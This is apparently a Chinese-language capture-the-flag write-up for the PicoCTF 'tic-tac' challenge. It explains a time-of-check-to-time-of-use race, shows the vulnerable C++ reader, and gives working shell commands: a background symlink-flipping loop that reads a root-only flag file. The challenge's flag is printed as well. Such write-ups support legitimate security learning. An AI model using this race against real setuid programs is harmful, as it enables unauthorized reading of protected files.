---
title: PicoCTF - tic-tac
tags: [PicoCTF, CTF, PWN]

---

# PicoCTF - tic-tac
## Background
[後端工程師面試考什麼 - Race Condition 篇](https://myapollo.com.tw/blog/interview-question-race-condition/)
[ [Day24]攻擊篇 ](https://ithelp.ithome.com.tw/articles/10208763)
> TOCTTOU
>
>Time of check to time of use
>在檢查和使用之間影響資源狀態的攻擊
>
>這種攻擊可能發生在共享資源中。
>可能導致程式在資源處於意外狀態時執行無效操作。
## Source code
:::spoiler Source code
```cpp=
#include <iostream>
#include <fstream>
#include <unistd.h>
#include <sys/stat.h>

int main(int argc, char *argv[]) {
  if (argc != 2) {
    std::cerr << "Usage: " << argv[0] << " <filename>" << std::endl;
    return 1;
  }

  std::string filename = argv[1];
  std::ifstream file(filename);
  struct stat statbuf;

  // Check the file's status information.
  if (stat(filename.c_str(), &statbuf) == -1) {
    std::cerr << "Error: Could not retrieve file information" << std::endl;
    return 1;
  }

  // Check the file's owner.
  if (statbuf.st_uid != getuid()) {
    std::cerr << "Error: you don't own this file" << std::endl;
    return 1;
  }

  // Read the contents of the file.
  if (file.is_open()) {
    std::string line;
    while (getline(file, line)) {
      std::cout << line << std::endl;
    }
  } else {
    std::cerr << "Error: Could not open file" << std::endl;
    return 1;
  }

  return 0;
}
```
:::
## Recon
第一次寫這一種題目，具@ccccctw所說算是考古題了，看了[^pico_pwn_wp_maple_tic_tac][^pico_pwn_wp_martin_tic_tac][^pico_pwn_wp_aydin_tic_tac]還是不知道怎麼做出來的，所以問了@ccccctw
1. 可以看到source code是檢查root權限才可以讀到flag
2. 用兩次soft link讓這支程式呈現race condiction的狀態(不見得每次都會所以要靠賽)
3. 首先要先用一個infinity while loop創兩個soft link，然後在背景執行，第一次的soft link(`$ ln -sf test1 test`)是為了要過掉root權限的檢查，而第二次的soft link(`ln -sf flag.txt test`)是用來讀flag的
具體來說是這樣：
test的link會在flag.txt和test1之間切換，若我們用txtreader讀取test時，會有權限檢查，如果此時的link是test1，權限檢查就會通過，此時如果剛好test的link指向flag.txt，那我們就可以無縫的讀取到flag.txt的內容
5. 接著就可以用他的txtreader讀取test，如果幸運的話就可以讀到需要root權限的flag
## Exploit
```bash
$ ssh ctf-player@saturn.picoctf.net -p 59620
$ touch test1
$ while true; do ln -sf flag.txt test; ln -sf test1 test; done &
[1] 3039
$ for i in {1..1000};do ./txtreader test; done > output
$ cat output
picoCTF{ToctoU_!s_3a5y_007659c9}
picoCTF{ToctoU_!s_3a5y_007659c9}
picoCTF{ToctoU_!s_3a5y_007659c9}
picoCTF{ToctoU_!s_3a5y_007659c9}
picoCTF{ToctoU_!s_3a5y_007659c9}
picoCTF{ToctoU_!s_3a5y_007659c9}
```

Flag: `picoCTF{ToctoU_!s_3a5y_007659c9}`
## Reference
[^pico_pwn_wp_maple_tic_tac]:[tic-tac maple](https://blog.maple3142.net/2023/03/29/picoctf-2023-writeups/#tic-tac)
[^pico_pwn_wp_martin_tic_tac]:[picoCTF 2023 tic-tac](https://youtu.be/ONMVfKDqCr0)
[^pico_pwn_wp_aydin_tic_tac]:[ TicTac (TOCTOU attack) - Pico CTF 2023 - Race Condition ](https://youtu.be/b1-Aw96zysM)